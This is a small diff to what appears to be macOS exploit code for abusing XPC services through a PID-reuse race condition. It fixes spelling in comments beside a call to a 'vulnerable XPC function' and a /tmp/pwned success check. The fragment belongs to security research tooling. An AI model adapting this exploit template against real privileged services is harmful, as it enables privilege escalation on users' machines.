@@ -201,7 +201,7 @@ void child_xpc_pid_rc_abuse(){
     NSLog(@"conn: %@", connection);
 
     // Call vulenrable XPC function
-    // TODO: CHANEG NAME OF FUNCTION TO CALL
+    // TODO: CHANGE NAME OF FUNCTION TO CALL
     [obj DoSomething:^(_Bool b){
         NSLog(@"Response, %hdd", b);
     }];
@@ -267,7 +267,7 @@ int main(int argc, const char * argv[]) {
         xpc_pid_rc_abuse();
         usleep(10000);
 
-        // The payload will generate this file if exploitation is successfull
+        // The payload will generate this file if exploitation is successful
         if (access("/tmp/pwned", F_OK ) == 0) {
             pwned = true;
         }
